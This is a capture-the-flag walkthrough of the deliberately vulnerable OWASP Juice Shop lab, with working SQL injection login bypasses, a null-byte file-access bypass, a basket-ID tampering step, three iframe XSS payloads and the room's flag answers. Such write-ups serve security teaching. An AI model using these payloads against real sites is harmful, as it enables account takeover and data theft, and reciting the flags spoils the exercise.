# OWASP Juice Shop


<details>
  <summary>Let's go on an adventure!</summary>

> ### Question #1: What's the Administrator's email address?

![image](https://github.com/user-attachments/assets/fb9c95d0-cdcf-40af-aafe-c9e7f277e950)

```email
admin@juice-sh.op
```

> ### Question #2: What parameter is used for searching? 

![image](https://github.com/user-attachments/assets/47062e0b-902d-46cb-91e7-bdc0eb7eb09c)


```java
q
```


> ### **Question #3: What show does Jim reference in his review?**

![image](https://github.com/user-attachments/assets/0c74ae57-65a4-465e-9451-4fdcc790bd74)

If we google "replicator" we will get the results indicating that it is from a TV show called Star Trek

![image](https://github.com/user-attachments/assets/1b0f3374-3ee6-47a6-9113-e77c3ce74379)


```
Star Trek
```

  
</details>





<details>
  <summary>Inject the juice</summary>

> ### Question #1: Log into the administrator account!

![image](https://github.com/user-attachments/assets/ee52bdd5-2a3d-4c7e-93df-c4e8612f8699)

```email
admin@juice-sh.op' OR 1=1-- -
```
or just

```sql
' OR 1=1-- -
```

![image](https://github.com/user-attachments/assets/92f6c8bd-9f49-451f-81a2-b388526365d4)

```
32a5e0f21372bcc1000a6088b93b458e41f0e02a
```


> ### Question #2: Log into the Bender account!

```
bender@juice-sh.op'-- -
```

![image](https://github.com/user-attachments/assets/bb505c8b-e8ef-468a-a90e-0ae7f377cc5f)



```
fb364762a3c102b2db932069c0e6b78e738d4066
```


  
</details>








<details>
  <summary>Who broke my lock?!</summary>


> ### Question #1: Bruteforce the Administrator account's password!

**wordlist**

``/usr/share/wordlists/SecLists/Passwords/Common-Credentials/best1050.txt``




   ![image](https://github.com/user-attachments/assets/17955eca-2cfe-4bf1-8d79-4e8b2fd7eca3)

   ![image](https://github.com/user-attachments/assets/287e80bf-09f7-41c9-9269-e6c9729d450f)


```
admin@juice-sh.op
```

```
admin123
```

```
c2110d06dc6f81c67cd8099ff0ba601241f1ac0e
```


> ### Question #2: Reset Jim's password!

```
jim@juice-sh.op
```

> your eldest siblings middle name?

[wikipedia](https://en.wikipedia.org/wiki/James_T._Kirk)

![image](https://github.com/user-attachments/assets/16100be3-3c0d-44c7-af61-080d4a45828a)

```
Samuel
```

![image](https://github.com/user-attachments/assets/1ab2bfda-b60e-41c3-9bfc-96bd22761475)


```
094fbc9b48e525150ba97d05b942bbf114987257
```




  
</details>











<details>
  <summary>AH! Don't look!</summary>


> ### Question #1: Access the Confidential Document!

![image](https://github.com/user-attachments/assets/aab92077-eb67-4a97-a9cb-c3b8a4e38ff8)

![image](https://github.com/user-attachments/assets/e2bd7984-0fd7-4dde-bcf1-0f2c5300fb8c)

Notice ``http://10.10.133.134/ftp/legal.md``

what if ??!!

```
http://10.10.133.134/ftp/
```

![image](https://github.com/user-attachments/assets/cc3c00bc-0cef-405a-9155-58e081865705)


> ### Question #2: Log into MC SafeSearch's account!

```
mc.safesearch@juice-sh.op
```

```
Mr. N00dles
```


```
66bdcffad9e698fd534003fbb3cc7e2b7b55d7f0
```


> ### Question #3: Download the Backup file!

```
http://10.10.133.134/ftp/package.json.bak
```

![image](https://github.com/user-attachments/assets/f2472569-7633-455f-8ffd-9d5837fc4c67)

```
http://10.10.133.134/ftp/package.json.bak%20%2500.md
```

To get around this, we will use a character bypass called "Poison Null Byte". A Poison Null Byte looks like this: %00. 

Note: as we can download it using the url, we will need to encode this into a url encoded format.

The Poison Null Byte will now look like this: %2500. Adding this and then a .md to the end will bypass the 403 error!

Why does this work? 

A Poison Null Byte is actually a NULL terminator. By placing a NULL character in the string at a certain byte, the string will tell the server to terminate at that point, nulling the rest of the string. 

  
</details>







<details>
  <summary>Who's flying this thing?</summary>


> ### Question #1: Access the administration page!

> `inspect` > `Debugger` > `main-es2015.js` 


![image](https://github.com/user-attachments/assets/5216514e-3652-40e2-9e54-91818c315986)


![image](https://github.com/user-attachments/assets/54c08f1f-5d37-431c-b7e6-8a836e17f5e4)

```
http://10.10.133.134/#/administration
```

![image](https://github.com/user-attachments/assets/3ee9ae6d-fdf1-4fb3-a5f9-82c85c4ffeaa)



```
946a799363226a24822008503f5d1324536629a0
```


> ### Question #2: View another user's shopping basket!



![image](https://github.com/user-attachments/assets/fffd8b1c-363b-460e-8d6d-6334922d12f3)

intercept the request using burp

![image](https://github.com/user-attachments/assets/827be8b4-7962-4593-9f00-6fe4fe92967e)

notice

```http
GET /rest/basket/1 HTTP/1.1

Host: 10.10.133.134
```

try to change `/rest/basket/1` to `/rest/basket/2`

![image](https://github.com/user-attachments/assets/353baa0c-d13c-4058-9a28-71665c03a61b)


```
41b997a36cc33fbe4f0ba018474e19ae5ce52121
```

> ### Question #3: Remove all 5-star reviews!




Navigate to the  `http://10.10.133.134/#/administration` page again and click the bin icon next to the review with 5 stars!


![image](https://github.com/user-attachments/assets/ca0523e4-0acf-48f6-b8a1-fd7645feed60)


![image](https://github.com/user-attachments/assets/ad5e5447-5ad6-47fa-a38c-22c676f45397)


```
50c97bcce0b895e446d61c83a21df371ac2266ef
```

  
</details>





<details>
  <summary>Where did that come from?</summary>


> ### Question #1: Perform a DOM XSS!

```
<iframe src="javascript:alert(`xss`)"> 
```

```
9aaf4bbea5c30d00a1f5bbcfce4db6d4b0efe0bf
```


> ### Question #2: Perform a persistent XSS!


Make sure that Burp intercept is on, so it will catch the logout request.

We will then head over to the Headers tab where we will add a new header:

```http
True-Client-IP                    <iframe src="javascript:alert(`xss`)">
```


![image](https://github.com/user-attachments/assets/85af40a9-035b-41aa-9df8-85d86fd92837)


```
149aa8ce13d7a4a8a931472308e269c94dc5f156
```


The True-Client-IP  header is similar to the X-Forwarded-For header, both tell the server or proxy what the IP of the client is. Due to there being no sanitation in the header we are able to perform an XSS attack. 




> ### Question #3: Perform a reflected XSS!

![image](https://github.com/user-attachments/assets/c28c2f92-1f0c-4d74-826c-2bf82f5faa49)

Login into the admin account and navigate to the 'Order History' page. 

> `Orders & Payments` > `Order History`

![image](https://github.com/user-attachments/assets/77cc5033-cb21-43c8-9761-64b3f85ebacb)



From there you will see a `"Truck"` icon, clicking on that will bring you to the track result page. You will also see that there is an id paired with the order.  

```url
http://10.10.133.134/#/track-result?id=5267-0429ae444373b967
```

```
http://10.10.133.134/#/track-result?id=<iframe src="javascript:alert(`xss`)">
```

![image](https://github.com/user-attachments/assets/aeb547c1-695d-4081-9897-0dead7bf9b0f)


```
23cefee1527bde039295b2616eeb29e1edc660a0
```




  
</details>



<details>
  <summary>Exploration!</summary>


> ### Access the /#/score-board/ page

![image](https://github.com/user-attachments/assets/608c8221-c68e-42ab-a3f6-19761debed18)


```
7efd3174f9dd5baa03a7882027f2824d2f72d86e
```


  
</details>





> [!Caution]
> #### there are more vulnerablities in  OWASP Juice Shop you can discover


```
http://10.10.133.134/#/score-board
```

























